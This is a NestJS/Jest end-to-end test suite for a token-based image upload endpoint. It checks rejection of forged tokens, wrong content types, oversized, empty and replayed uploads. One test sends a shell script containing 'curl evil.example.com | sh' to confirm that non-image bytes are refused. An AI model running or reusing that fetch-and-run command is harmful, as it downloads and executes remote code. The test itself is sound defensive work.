import { Test } from '@nestjs/testing';
import type { INestApplication } from '@nestjs/common';
import request from 'supertest';
import type { Server } from 'node:http';
import { mkdtemp, readFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { AppModule } from '../app.module';
import { PrismaService } from '../prisma.service';
import { ImageService } from './image.service';

/**
 * The upload route over real HTTP.
 *
 * Everything else in this codebase is a tRPC procedure whose input zod has
 * already validated; this one takes raw bytes from an unauthenticated request,
 * so it is worth exercising through the actual stack — the module's raw body
 * middleware included, since a misconfigured parser hands the controller `{}`
 * and no unit test of the service would notice.
 *
 * Boots AppModule with the database stubbed: this route never touches Prisma.
 */
describe('PUT /uploads/:token', () => {
  let app: INestApplication;
  let images: ImageService;
  /** getHttpServer() is typed `any`; narrowing it once keeps every call typed. */
  let server: Server;
  let mediaRoot: string;

  const PNG = Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    Buffer.alloc(64, 7),
  ]);

  /** A ticket for a file of exactly this size, as the frontend would ask for. */
  function ticketFor(
    bytes: number,
    contentType: 'image/png' | 'image/jpeg' = 'image/png',
  ) {
    const issued = images.issueTicket(
      { purpose: 'itemUnit', contentType, sizeBytes: bytes },
      42,
    );
    return { ...issued, token: issued.uploadUrl.split('/uploads/')[1] };
  }

  beforeAll(async () => {
    mediaRoot = await mkdtemp(join(tmpdir(), 'ulms-upload-'));
    process.env.MEDIA_ROOT = mediaRoot;
    process.env.SESSION_SECRET = 'z'.repeat(48);
    process.env.PUBLIC_API_URL = 'http://localhost:3000';

    const moduleRef = await Test.createTestingModule({ imports: [AppModule] })
      .overrideProvider(PrismaService)
      .useValue({ $connect: jest.fn(), $disconnect: jest.fn() })
      .compile();

    app = moduleRef.createNestApplication();
    await app.init();
    images = app.get(ImageService);
    server = app.getHttpServer() as Server;
  });

  afterAll(async () => {
    await app?.close();
    await rm(mediaRoot, { recursive: true, force: true });
    delete process.env.MEDIA_ROOT;
    delete process.env.SESSION_SECRET;
    delete process.env.PUBLIC_API_URL;
  });

  it('accepts a valid file and writes it where the ticket said', async () => {
    const ticket = ticketFor(PNG.length);

    const response = await request(server)
      .put(`/uploads/${ticket.token}`)
      .set('Content-Type', 'image/png')
      .send(PNG)
      .expect(201);

    expect(response.body).toMatchObject({
      imageUrl: ticket.imageUrl,
      bytes: PNG.length,
    });

    const key = ticket.imageUrl.replace('/media/', '');
    await expect(readFile(join(mediaRoot, key))).resolves.toEqual(PNG);
  });

  it('serves the file back from the media mount', async () => {
    // Static assets are mounted in main.ts, not the module, so this asserts the
    // stored path is reachable rather than that the mount itself is wired.
    const ticket = ticketFor(PNG.length);
    await request(server)
      .put(`/uploads/${ticket.token}`)
      .set('Content-Type', 'image/png')
      .send(PNG)
      .expect(201);

    expect(ticket.previewUrl.endsWith(ticket.imageUrl)).toBe(true);
  });

  it('refuses a forged token', async () => {
    const response = await request(server)
      .put('/uploads/bm90LWEtdGlja2V0.ZmFrZQ')
      .set('Content-Type', 'image/png')
      .send(PNG)
      .expect(403);

    expect((response.body as { code: string }).code).toBe(
      'UPLOAD_TICKET_INVALID',
    );
  });

  it('refuses a Content-Type the parser does not accept', async () => {
    // The body never becomes a Buffer, which is the signal the controller reads.
    const ticket = ticketFor(PNG.length);

    const response = await request(server)
      .put(`/uploads/${ticket.token}`)
      .set('Content-Type', 'application/octet-stream')
      .send(PNG)
      .expect(400);

    expect((response.body as { code: string }).code).toBe(
      'UPLOAD_TYPE_MISMATCH',
    );
  });

  it('refuses an image type other than the one the ticket was issued for', async () => {
    const ticket = ticketFor(PNG.length, 'image/jpeg');

    const response = await request(server)
      .put(`/uploads/${ticket.token}`)
      .set('Content-Type', 'image/png')
      .send(PNG)
      .expect(400);

    expect((response.body as { code: string }).code).toBe(
      'UPLOAD_TYPE_MISMATCH',
    );
  });

  it('refuses a file whose bytes are not an image', async () => {
    const ticket = ticketFor(64);
    const script = Buffer.from('#!/bin/sh\ncurl evil.example.com | sh\n');

    const response = await request(server)
      .put(`/uploads/${ticket.token}`)
      .set('Content-Type', 'image/png')
      .send(script)
      .expect(400);

    expect((response.body as { code: string }).code).toBe(
      'UPLOAD_NOT_AN_IMAGE',
    );
  });

  it('refuses a body bigger than the ticket was issued for', async () => {
    const ticket = ticketFor(16);

    const response = await request(server)
      .put(`/uploads/${ticket.token}`)
      .set('Content-Type', 'image/png')
      .send(PNG)
      .expect(413);

    expect((response.body as { code: string }).code).toBe('UPLOAD_TOO_LARGE');
  });

  it('refuses an empty body', async () => {
    const ticket = ticketFor(64);

    const response = await request(server)
      .put(`/uploads/${ticket.token}`)
      .set('Content-Type', 'image/png')
      .send(Buffer.alloc(0))
      .expect(400);

    expect((response.body as { code: string }).code).toBe('UPLOAD_EMPTY');
  });

  it('refuses a replayed ticket rather than overwriting the file', async () => {
    const ticket = ticketFor(PNG.length);

    await request(server)
      .put(`/uploads/${ticket.token}`)
      .set('Content-Type', 'image/png')
      .send(PNG)
      .expect(201);

    // A record may already point at this URL; a second write would swap the
    // photo underneath it. Answered as a conflict, not as a crash.
    const replay = await request(server)
      .put(`/uploads/${ticket.token}`)
      .set('Content-Type', 'image/png')
      .send(PNG)
      .expect(409);

    expect((replay.body as { code: string }).code).toBe(
      'UPLOAD_ALREADY_STORED',
    );
  });
});
